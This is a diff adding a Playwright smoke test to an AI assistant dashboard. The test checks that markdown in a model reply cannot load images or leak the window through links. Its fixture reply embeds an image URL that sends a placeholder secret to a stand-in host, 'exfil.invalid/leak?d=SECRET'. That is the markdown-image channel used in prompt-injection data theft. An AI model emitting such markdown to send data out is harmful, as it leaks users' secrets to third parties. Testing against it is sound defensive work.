@@ -151,3 +151,37 @@ test("@smoke an irreversible change must be confirmed by typing its id", async (
   await expect(card.getByText("Denied. Nothing was changed.")).toBeVisible()
   expect(decision).toEqual({ decision: "deny" })
 })
+
+test("@smoke a reply cannot make the dashboard fetch an image or leak the window through a link", async ({ page }) => {
+  const exfil: string[] = []
+  page.on("request", (request) => {
+    if (request.url().includes("exfil.invalid")) exfil.push(request.url())
+  })
+  await page.route("**/exfil.invalid/**", (route) => route.abort())
+  const createdAt = new Date().toISOString()
+  const content = "Here you go ![chart](https://exfil.invalid/leak?d=SECRET) and [docs](https://exfil.invalid/docs)."
+  await page.route("**/messages/stream", (route) =>
+    route.fulfill({
+      status: 200,
+      contentType: "text/event-stream",
+      body:
+        sse("text", { type: "text", delta: content }) +
+        sse("done", {
+          type: "done", thread: { id: "t" },
+          userMessage: { id: "m1", role: "user", content: "x", createdAt },
+          assistantMessage: { id: "m2", role: "assistant", content, createdAt },
+        }),
+    }),
+  )
+
+  await page.goto(`${basePath}/assistant`)
+  await page.getByLabel("Message input").fill("show me")
+  await page.getByRole("button", { name: "Send message" }).click()
+
+  await expect(page.getByText("[image not loaded: chart]")).toBeVisible()
+  await expect(page.locator(".aui-md img")).toHaveCount(0)
+  const link = page.getByRole("link", { name: "docs" })
+  await expect(link).toHaveAttribute("rel", /noopener/)
+  await expect(link).toHaveAttribute("target", "_blank")
+  expect(exfil).toEqual([])
+})
